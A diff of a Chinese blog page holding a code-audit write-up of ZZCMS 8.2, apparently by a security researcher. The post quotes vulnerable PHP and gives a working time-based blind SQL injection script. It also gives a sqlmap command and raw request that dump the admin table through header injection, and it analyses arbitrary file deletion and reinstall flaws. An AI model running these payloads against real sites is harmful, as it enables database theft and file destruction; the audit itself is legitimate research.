@@ -6,18 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 风筝</title>
+  <title>ZZCMS8.2 代码审计 | 风筝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="风筝">
-<meta property="og:type" content="website">
-<meta property="og:title" content="风筝">
-<meta property="og:url" content="http://yoursite.com/archives/page/3/index.html">
+  <meta name="description" content="ZZCMS8.2 代码审计前言SQL漏洞漏洞发生在/user/del.php 第95行1234567891011&amp;lt;?php$pagename=trim($_POST[&quot;pagename&quot;]);$tablename=trim($_POST[&quot;tablename&quot;]);...if (strpos($id,&quot;,&quot;)&amp;gt;0)&amp;#123;		$sql=&quot;select id,saver from &quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZZCMS8.2 代码审计">
+<meta property="og:url" content="http://yoursite.com/2019/11/11/zzcms8.2/index.html">
 <meta property="og:site_name" content="风筝">
-<meta property="og:description" content="风筝">
+<meta property="og:description" content="ZZCMS8.2 代码审计前言SQL漏洞漏洞发生在/user/del.php 第95行1234567891011&amp;lt;?php$pagename=trim($_POST[&quot;pagename&quot;]);$tablename=trim($_POST[&quot;tablename&quot;]);...if (strpos($id,&quot;,&quot;)&amp;gt;0)&amp;#123;		$sql=&quot;select id,saver from &quot;">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/19/nqQOo9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/20/nX1JFe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/22/uSQwLR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/23/uii6TU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/24/ukzVN4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/24/uAukSP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/24/uAuwf1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/25/uEr3bF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/09/u4wm5V.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/09/u4wHI0.png">
+<meta property="og:updated_time" content="2019-10-09T02:59:02.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="风筝">
-<meta name="twitter:description" content="风筝">
+<meta name="twitter:title" content="ZZCMS8.2 代码审计">
+<meta name="twitter:description" content="ZZCMS8.2 代码审计前言SQL漏洞漏洞发生在/user/del.php 第95行1234567891011&amp;lt;?php$pagename=trim($_POST[&quot;pagename&quot;]);$tablename=trim($_POST[&quot;tablename&quot;]);...if (strpos($id,&quot;,&quot;)&amp;gt;0)&amp;#123;		$sql=&quot;select id,saver from &quot;">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/09/19/nqQOo9.png">
   
     <link rel="alternative" href="/atom.xml" title="风筝" type="application/atom+xml">
   
@@ -153,268 +165,200 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-zzcms8.2" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ZZCMS8.2 代码审计
+    </h1>
+  
+
+        
+        <a href="/2019/11/11/zzcms8.2/" class="archive-article-date">
+  	<time datetime="2019-11-11T04:40:26.821Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ZZCMS8-2-代码审计"><a href="#ZZCMS8-2-代码审计" class="headerlink" title="ZZCMS8.2 代码审计"></a>ZZCMS8.2 代码审计</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="SQL漏洞"><a href="#SQL漏洞" class="headerlink" title="SQL漏洞"></a>SQL漏洞</h2><h3 id="漏洞发生在-user-del-php-第95行"><a href="#漏洞发生在-user-del-php-第95行" class="headerlink" title="漏洞发生在/user/del.php 第95行"></a>漏洞发生在/user/del.php 第95行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pagename=trim($_POST[<span class="string">"pagename"</span>]);</span><br><span class="line">$tablename=trim($_POST[<span class="string">"tablename"</span>]);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>)&#123;	</span><br><span class="line">	$sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;	</span><br><span class="line">	$sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$rs=query($sql);</span><br></pre></td></tr></table></figure>
+<p>可见post传入的tablename没有做严格的过滤，而且拼接在sql语句中，下面用bp抓包测试一下<br><img src="https://s2.ax1x.com/2019/09/19/nqQOo9.png" alt="image"></p>
+<p>因为代码中未有输出位，所以这里用延时盲注    </p>
+<pre><code>![image](https://s2.ax1x.com/2019/09/19/nqrVb9.png)
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'</span>  </span><br><span class="line">url = <span class="string">"http://www.wyc.com/user/del.php"</span></span><br><span class="line">user = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line"></span><br><span class="line">		startTime = time.time()	</span><br><span class="line">		str1 = str(ord(payload))		</span><br><span class="line">		post_data = <span class="string">"id=1&amp;tablename=zzcms_answer where id=0 union select 1,2 and if((ascii(substr(database(),%s,1))=%s),sleep(2),1)#"</span>%(i,str1)</span><br><span class="line"></span><br><span class="line">		headers=&#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line">		cookie=&#123;<span class="string">'bdshare_firstime'</span>:<span class="string">'1568780385995'</span>,<span class="string">'PHPSESSID'</span>:<span class="string">'7fih9osc4vupgl87u76unqvsag'</span>,<span class="string">'UserName'</span>:<span class="string">'test'</span>,<span class="string">'PassWord'</span>:<span class="string">'098f6bcd4621d373cade4e832627b4f6'</span>&#125;</span><br><span class="line">		response = requests.post(url,timeout=<span class="number">6</span>,data=post_data,headers=headers,cookies=cookie)</span><br><span class="line">		subtract = time.time()- startTime		</span><br><span class="line">		<span class="keyword">if</span> time.time() - startTime &gt;<span class="number">2</span>:</span><br><span class="line">			user = user + payload</span><br><span class="line">			<span class="keyword">print</span> user</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/09/20/nX1JFe.png" alt="image"></p>
+<h3 id="漏洞发生在user-logincheck-php第84行"><a href="#漏洞发生在user-logincheck-php第84行" class="headerlink" title="漏洞发生在user/logincheck.php第84行"></a>漏洞发生在user/logincheck.php第84行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$sql=<span class="string">"select * from zzcms_user where username='"</span>.$username.<span class="string">"' and  password='"</span>.$password.<span class="string">"' "</span>;</span><br><span class="line">$rs = query($sql); </span><br><span class="line">$row= num_rows($rs);</span><br><span class="line"><span class="keyword">if</span>(!$row)&#123;</span><br><span class="line">....</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">....</span><br><span class="line">	$rs = query($sql); </span><br><span class="line">	$row= fetch_array($rs);</span><br><span class="line">		<span class="keyword">if</span>(!$row)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('用户被锁定！');history.go(-1)&lt;/script&gt;"</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		query(<span class="string">"delete from zzcms_login_times where ip='$ip'"</span>);<span class="comment">//登录成功后，把登录次数记录删了</span></span><br><span class="line">		query(<span class="string">"UPDATE zzcms_user SET showlogintime = lastlogintime WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新上次登录时间</span></span><br><span class="line">		query(<span class="string">"UPDATE zzcms_user SET showloginip = loginip WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新上次登录IP</span></span><br><span class="line">		query(<span class="string">"UPDATE zzcms_user SET logins = logins+1 WHERE username='"</span>.$username.<span class="string">"'"</span>);</span><br><span class="line">		query(<span class="string">"UPDATE zzcms_user SET loginip = '"</span>.getip().<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新最后登录IP</span></span><br><span class="line">		<span class="keyword">if</span> (strtotime(date(<span class="string">"Y-m-d H:i:s"</span>))-strtotime($row[<span class="string">'lastlogintime'</span>])&gt;<span class="number">86400</span>)&#123;</span><br><span class="line">		query(<span class="string">"UPDATE zzcms_user SET totleRMB = totleRMB+"</span>.jf_login.<span class="string">" WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//登录时加积分</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query(<span class="string">"UPDATE zzcms_user SET loginip = '"</span>.getip().<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure>
+<p>看一下getip的定义:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getip()&#123; </span><br><span class="line">if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); </span><br><span class="line">else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); </span><br><span class="line">else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;REMOTE_ADDR&quot;); </span><br><span class="line">else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) </span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; </span><br><span class="line">else </span><br><span class="line">$ip = &quot;unknown&quot;; </span><br><span class="line">return($ip); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可见对getip没有什么过滤，存在ip注入，这里用sqlmap跑一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r sqlmap\sql.txt --batch -D zzcms -T zzcms_admin -C &apos;admin,pass&apos; --dump</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//sql.txt</span><br><span class="line">POST /user/logincheck.php HTTP/1.1</span><br><span class="line">Host: www.wyc.com</span><br><span class="line">Content-Length: 111</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://www.wyc.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://www.wyc.com/user/login.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7</span><br><span class="line">Cookie: bdshare_firstime=1568780385995; PHPSESSID=7fih9osc4vupgl87u76unqvsag</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 127.0.0.1*</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/09/22/uSQwLR.png" alt="image"></p>
+<h2 id="任意文件删掉漏洞"><a href="#任意文件删掉漏洞" class="headerlink" title="任意文件删掉漏洞"></a>任意文件删掉漏洞</h2><h3 id="漏洞发生在-user-adv-php第80行"><a href="#漏洞发生在-user-adv-php第80行" class="headerlink" title="漏洞发生在/user/adv.php第80行"></a>漏洞发生在/user/adv.php第80行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"action"</span>]))&#123;</span><br><span class="line">$action=$_REQUEST[<span class="string">"action"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$action=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"adv"</span>]))&#123;</span><br><span class="line">$adv=$_REQUEST[<span class="string">"adv"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$adv=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"advlink"</span>]))&#123;</span><br><span class="line">$advlink=$_REQUEST[<span class="string">"advlink"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$advlink=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"company"</span>]))&#123;</span><br><span class="line">$company=$_REQUEST[<span class="string">"company"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$company=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"img"</span>]))&#123;</span><br><span class="line">$img=$_REQUEST[<span class="string">"img"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$img=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"oldimg"</span>]))&#123;</span><br><span class="line">$oldimg=$_REQUEST[<span class="string">"oldimg"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$oldimg=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"modify"</span>)&#123;</span><br><span class="line">query(<span class="string">"update zzcms_textadv set adv='$adv',company='$company',advlink='$advlink',img='$img',passed=0 where username='"</span>.$_COOKIE[<span class="string">"UserName"</span>].<span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">if</span> ($oldimg&lt;&gt;$img)&#123;</span><br><span class="line">		$f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">		<span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">		unlink($f);		</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可见$f中的$oldimg变量是可控的，而且没有对此做什么限制，可构造任意删掉文件漏洞</p>
+<p><img src="https://s2.ax1x.com/2019/09/23/uii6TU.png" alt="image"></p>
+<p>同样的漏洞也出现/user/licence_save.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">if ($_GET[&quot;action&quot;]==&quot;add&quot;)&#123;</span><br><span class="line">query(&quot;Insert into zzcms_licence(title,img,editor,sendtime) values(&apos;$title&apos;,&apos;$img&apos;,&apos;$username&apos;,&apos;&quot;.date(&apos;Y-m-d H:i:s&apos;).&quot;&apos;)&quot;) ; </span><br><span class="line">&#125;elseif ($_GET[&quot;action&quot;]==&quot;modify&quot;)&#123;</span><br><span class="line">$oldimg=trim($_POST[&quot;oldimg&quot;]);</span><br><span class="line">	$id=$_POST[&quot;id&quot;];</span><br><span class="line">	if ($id==&quot;&quot; || is_numeric($id)==false)&#123;</span><br><span class="line">		$FoundErr=1;</span><br><span class="line">		$ErrMsg=&quot;&lt;li&gt;&quot;. $f_array[0].&quot;&lt;/li&gt;&quot;;</span><br><span class="line">		WriteErrMsg($ErrMsg);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">	query(&quot;update zzcms_licence set title=&apos;$title&apos;,img=&apos;$img&apos;,sendtime=&apos;&quot;.date(&apos;Y-m-d H:i:s&apos;).&quot;&apos;,passed=0 where id=&apos;$id&apos;&quot;);</span><br><span class="line">		if ($oldimg&lt;&gt;$img &amp;&amp; $oldimg&lt;&gt;&quot;/image/nopic.gif&quot;)&#123;</span><br><span class="line">			$f=&quot;../&quot;.$oldimg;</span><br><span class="line">			if (file_exists($f))&#123;</span><br><span class="line">			unlink($f);</span><br><span class="line">			&#125;</span><br><span class="line">			$fs=&quot;../&quot;.str_replace(&quot;.&quot;,&quot;_small.&quot;,$oldimg).&quot;&quot;;</span><br><span class="line">			if (file_exists($fs))&#123;</span><br><span class="line">			unlink($fs);		</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="网站重装getshell漏洞"><a href="#网站重装getshell漏洞" class="headerlink" title="网站重装getshell漏洞"></a>网站重装getshell漏洞</h2><h3 id="漏洞发生在-install-index-php"><a href="#漏洞发生在-install-index-php" class="headerlink" title="漏洞发生在/install/index.php"></a>漏洞发生在/install/index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">...</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../inc/config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">$submit = <span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">		...</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">dexit</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("'</span>.$msg.<span class="string">'");window.history.back();&lt;/script&gt;'</span>;</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		$conn=connect($db_host,$db_user,$db_pass,<span class="string">''</span>,$db_port);</span><br><span class="line">		<span class="keyword">if</span>(!$conn) dexit(<span class="string">'无法连接到数据库服务器，请检查配置'</span>);</span><br><span class="line">		$db_name <span class="keyword">or</span> dexit(<span class="string">'请填写数据库名'</span>);</span><br><span class="line">		<span class="keyword">if</span>(!select_db($db_name)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(!query(<span class="string">"CREATE DATABASE $db_name"</span>)) dexit(<span class="string">'指定的数据库不存在\n\n系统尝试创建失败，请通过其他方式建立数据库'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">		$fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">		$f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">		$str = fread($f,filesize($fp));</span><br><span class="line">		fclose($f);</span><br><span class="line">		$str=str_replace(<span class="string">"define('sqlhost','"</span>.sqlhost.<span class="string">"')"</span>,<span class="string">"define('sqlhost','$db_host')"</span>,$str) ;</span><br><span class="line">		$str=str_replace(<span class="string">"define('sqlport','"</span>.sqlport.<span class="string">"')"</span>,<span class="string">"define('sqlport','$db_port')"</span>,$str) ;</span><br><span class="line">		$str=str_replace(<span class="string">"define('sqldb','"</span>.sqldb.<span class="string">"')"</span>,<span class="string">"define('sqldb','$db_name')"</span>,$str) ;</span><br><span class="line">		$str=str_replace(<span class="string">"define('sqluser','"</span>.sqluser.<span class="string">"')"</span>,<span class="string">"define('sqluser','$db_user')"</span>,$str) ;</span><br><span class="line">		$str=str_replace(<span class="string">"define('sqlpwd','"</span>.sqlpwd.<span class="string">"')"</span>,<span class="string">"define('sqlpwd','$db_pass')"</span>,$str) ;</span><br><span class="line">		$str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">		$str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br><span class="line">		$f=fopen($fp,<span class="string">"w+"</span>);</span><br><span class="line">		fputs($f,$str);</span><br><span class="line">		fclose($f);</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>代码中通过传入的step的值是多少对应该目录下的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">switch($step) &#123;</span><br><span class="line">	case &apos;1&apos;:</span><br><span class="line">		include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">	break;</span><br></pre></td></tr></table></figure></p>
+<p>仔细阅读该每一个step文件可知，只有当step=1的时候才会检测/install/install.lock文件是否存在。</p>
